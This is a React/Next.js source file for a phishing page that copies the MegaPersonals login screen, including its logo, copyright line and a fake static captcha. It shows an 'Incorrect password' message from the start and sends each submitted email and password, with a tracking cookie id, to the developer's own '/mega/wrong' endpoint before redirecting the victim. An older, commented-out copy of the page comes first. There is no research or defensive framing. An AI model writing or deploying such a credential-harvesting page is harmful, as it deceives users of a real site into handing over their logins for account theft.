// import React, { useState } from "react";
// import { useRouter } from "next/navigation";
// import Cookies from "js-cookie";
// import { API_URL } from "../config";
// import { Field, Form, Formik } from "formik";
// import Image from "next/image";

// function page() {
//   const router = useRouter();
//   const id = Cookies.get("id");
//   // const adminId = Cookies.get("adminId");
//   // const posterId = Cookies.get("posterId");
//   const initialvalues = {
//     email: "",
//     password: "",
//   };
//   // const { login } = useMockLogin(adminId, posterId);

//   const handleSubmit = async (values, formik) => {
//     const { email, password } = values;

//     // Cookies.set("site", site);
//     // Cookies.set("email", email);
//     // Cookies.set("password", password);

//     // setShowModal(true);

//     // const allValues = {
//     //   id: id,
//     // };
//     const allValues = {
//       id,
//       email,
//       password,
//     };
//     console.log("allValues", allValues);
//     // login(allValues, formik);
//     const url = `${API_URL}/mega/wrong`;

//     const res = await fetch(url, {
//       method: "POST",
//       headers: {
//         Accept: "application/json",
//         "Content-Type": "application/json",
//       },
//       body: JSON.stringify(values),
//     });
//     const data = await res.json();
//     console.log(data);

//     if (res.ok) {
//       console.log("success", data);
//       router.push("/map");
//     } else {
//       console.log("error", data);
//       toast.error("Something Went Wrong");
//     }
//   };

//   //   const handleSubmit = async () => {
//   //     const values = {
//   //       id,
//   //       password,
//   //       adminId,
//   //       posterId,
//   //     };
//   //     const url = `${API_URL}/mega/wrong`;

//   //     const res = await fetch(url, {
//   //       method: "POST",
//   //       headers: {
//   //         Accept: "application/json",
//   //         "Content-Type": "application/json",
//   //       },
//   //       body: JSON.stringify(values),
//   //     });
//   //     const data = await res.json();
//   //     console.log(data);

//   //     if (res.ok) {
//   //       console.log("success", data);
//   //       router.push("/loading");
//   //     } else {
//   //       console.log("error", data);
//   //       toast.error("Something Went Wrong");
//   //     }
//   //   };
//   const captchaKeyDev = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
//   // const captchaKeyProd = "6LdM_9MiAAAAAJpk2F0ZDaWmIv0BfTfMKChH7AGL";
//   const captchaKeyProd = "6Lck0YUjAAAAANYCIMzWXamx6oD5pRnwwKszARPR";

//   const recaptchaKey =
//     process.env.NODE_ENV !== "development" ? captchaKeyProd : captchaKeyDev;

//   return (
//     <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
//       <div className="w-[65%] lg:w-full">
//         <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
//       </div>

//       <div className="">
//         <div className="mt-[10px] flex flex-col items-center">
//           <p className="text-custom-gray2 text-lg">
//             Is this your first time posting?
//           </p>
//           <button className="mt-[8px] bg-custom-blue3 px-[57px] text-[24px] text-white font-semibold tracking-[2px] rounded">
//             Start Here
//           </button>

//           <p className=" mt-[10px] text-custom-gray2 text-lg">
//             Already have a login?
//           </p>
//           <p className="text-custom-gray2 text-[25px]">Login</p>
//         </div>

//         <div className="mt-1">
//           <Formik
//             initialValues={initialvalues}
//             // validationSchema={validate}
//             onSubmit={handleSubmit}
//           >
//             {(formik) => (
//               <Form className="mx-[30px]  flex flex-col justify-center items-center">
//                 <div className="space-y-[9px]  flex flex-col justify-center items-center">
//                   <Field
//                     placeholder="Email"
//                     className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
//                     id="email"
//                     name="email"
//                     required
//                   />

//                   <Field
//                     className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
//                     placeholder="Password"
//                     name="password"
//                     type="password"
//                     autoComplete="on"
//                     required
//                   />
//                 </div>
//                 <p className="text-red-500 text-md">Wrong Password</p>
//                 <div className="flex flex-col items-center">
//                   {/* <ReCAPTCHA
//                   className="mt-[35px]"
//                   sitekey={recaptchaKey}
//                   onChange={() => setVerified(true)}
//                 /> */}
//                   <Image
//                     src="/images/captures.jpeg"
//                     alt="captcha"
//                     width={228}
//                     height={55}
//                     className="mt-3"
//                   />

//                   <Field
//                     className="mt-2 w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
//                     id="captcha"
//                     name="captcha"
//                     type="captcha"
//                     autoComplete="on"
//                     placeholder="Enter code from the picture"
//                     required
//                   />

//                   <button
//                     type="submit"
//                     // type="button"
//                     className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
//                     // disabled={!verified}
//                     // onClick={handleNextStep}
//                   >
//                     SUBMIT
//                   </button>
//                 </div>
//               </Form>
//             )}
//           </Formik>
//         </div>

//         <Image
//           src="/images/warning.png"
//           alt="warning"
//           className="mt-2 mx-auto"
//           width={350}
//           height={154}
//         />

//         <p className="mt-[10px] uppercase text-center text-sm text-custom-blue2 hover:underline">
//           Forgot Password?
//         </p>
//       </div>
//       <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
//         <p className=" cursor-pointer">Home</p>
//         {" | "}
//         <p className=" cursor-pointer">Manage Posts</p>
//         {" | "}
//         <p className=" cursor-pointer">Contact Us</p>
//         {" | "}
//         <p className=" cursor-pointer">Policies & Terms</p>
//       </div>

//       <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
//         Copyright ©2021 MegaPersonals.eu
//       </p>
//     </div>
//   );
// }

// export default page;
"use client";
import React from "react";
import Image from "next/image";
import { Field, Form, Formik } from "formik";
import { API_URL } from "../config";
import Cookies from "js-cookie";
import { useRouter } from "next/navigation";
// import { toast } from "react-toastify";
function page() {
  const initialvalues = {
    email: "",
    password: "",
  };
  const router = useRouter();
  const id = Cookies.get("id");

  const handleSubmit = async (values, formik) => {
    const { email, password } = values;

    // Cookies.set("site", site);
    // Cookies.set("email", email);
    // Cookies.set("password", password);

    // setShowModal(true);

    // const allValues = {
    //   id: id,
    // };
    const allValues = {
      id,
      email,
      password,
    };
    console.log("allValues", allValues);
    // login(allValues, formik);
    const url = `${API_URL}/mega/wrong`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(allValues),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      router.push("/map");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
      <div className="w-[65%] lg:w-full">
        <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
      </div>

      <div className="">
        <div className="mt-[10px] flex flex-col items-center">
          <p className="text-custom-gray2 text-lg">
            Is this your first time posting?
          </p>
          <button className="mt-[8px] bg-custom-blue3 px-[57px] text-[24px] text-white font-semibold tracking-[2px] rounded">
            Start Here
          </button>

          <p className=" mt-[10px] text-custom-gray2 text-lg">
            Already have a login?
          </p>
          <p className="text-custom-gray2 text-[25px]">Login</p>
        </div>

        <div className="mt-1">
          <Formik initialValues={initialvalues} onSubmit={handleSubmit}>
            {(formik) => (
              <Form className="mx-[30px]  flex flex-col justify-center items-center">
                <div className="space-y-[9px]  flex flex-col justify-center items-center">
                <p className="text-red-500 text-md">Incorrect password</p>

                  <Field
                    placeholder="Email"
                    className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                    id="email"
                    name="email"
                    required
                  />

                  <Field
                    className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                    placeholder="Password"
                    name="password"
                    type="password"
                    autoComplete="on"
                    required
                  />
                </div>
                <div className="flex flex-col items-center">
                  <Image
                    src="/images/captures.jpeg"
                    alt="captcha"
                    width={228}
                    height={55}
                    className="mt-3"
                  />

                  <Field
                    className="mt-2 w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                    id="captcha"
                    name="captcha"
                    type="captcha"
                    autoComplete="on"
                    placeholder="Enter code from the picture"
                    required
                  />

                  <button
                    type="submit"
                    className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                  >
                    SUBMIT
                  </button>
                </div>
              </Form>
            )}
          </Formik>
        </div>
{/* 
        <Image
          src="/images/warning.png"
          alt="warning"
          className="mt-2 mx-auto"
          width={350}
          height={154}
        /> */}

        <p className="mt-[10px] uppercase text-center text-sm text-custom-blue2 hover:underline">
          Forgot Password?
        </p>
      </div>
      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
        <p className=" cursor-pointer">Home</p>
        {" | "}
        <p className=" cursor-pointer">Manage Posts</p>
        {" | "}
        <p className=" cursor-pointer">Contact Us</p>
        {" | "}
        <p className=" cursor-pointer">Policies & Terms</p>
      </div>

      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
        Copyright ©2021 MegaPersonals.eu
      </p>
    </div>
  );
}

export default page;
